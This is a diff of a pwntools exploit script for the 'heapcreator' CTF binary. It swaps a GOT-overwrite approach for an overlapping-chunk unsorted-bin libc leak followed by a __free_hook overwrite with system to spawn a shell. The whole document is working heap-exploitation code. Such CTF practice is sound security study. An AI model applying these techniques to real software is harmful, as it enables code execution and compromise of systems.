@@ -2,10 +2,10 @@
 # -*- coding: utf-8 -*-
 
 from pwn import *
-
+#context.log_level = 'debug'
 r = process('./heapcreator')
-heap = ELF('./heapcreator')
-libc = ELF('./libc.so.6')
+#heap = ELF('./heapcreator')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 
 def create(size, content):
@@ -40,31 +40,23 @@ def delete(idx):
     r.sendline(str(idx))
 
 
-free_got = 0x602018
-create(0x18, "dada")  # 0
-create(0x10, "ddaa")  # 1
-# overwrite heap 1's struct's size to 0x41
-edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")
-# trigger heap 1's struct to fastbin 0x40
-# heap 1's content to fastbin 0x20
+create(0x18, '/bin/sh')
+create(0x18, '1')
+create(0x18, '2')
+create(0x18, '3')
+create(0x18, '4')
+edit(0, 'a'*0x18+'\xa1')
 delete(1)
-# new heap 1's struct will point to old heap 1's content, size 0x20
-# new heap 1's content will point to old heap 1's struct, size 0x30
-# that is to say we can overwrite new heap 1's struct
-# here we overwrite its heap content pointer to free@got
-create(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))  #1
-# leak freeaddr
+delete(4)
+create(0x98, '5')
+edit(1, 'a'*7)
 show(1)
-r.recvuntil("Content : ")
-data = r.recvuntil("Done !")
-
-free_addr = u64(data.split("\n")[0].ljust(8, "\x00"))
-libc_base = free_addr - libc.symbols['free']
-log.success('libc base addr: ' + hex(libc_base))
-system_addr = libc_base + libc.symbols['system']
-#gdb.attach(r)
-# overwrite free@got with system addr
-edit(1, p64(system_addr))
-# trigger system("/bin/sh")
-delete(0)
+r.recvuntil('a'*7+'\x0a')
+libc_base = u64(r.recv(6)+'\x00\x00')-88-0x3C4B20
+success(hex(libc_base))
+free_hook = libc_base+libc.symbols['__free_hook']
+libc_system = libc_base+libc.symbols['system']
+edit(1, '/bin/sh\x00'.ljust(0x40, 'a')+p64(0x10)+p64(free_hook))
+edit(2, p64(libc_system))
+delete(1)
 r.interactive()
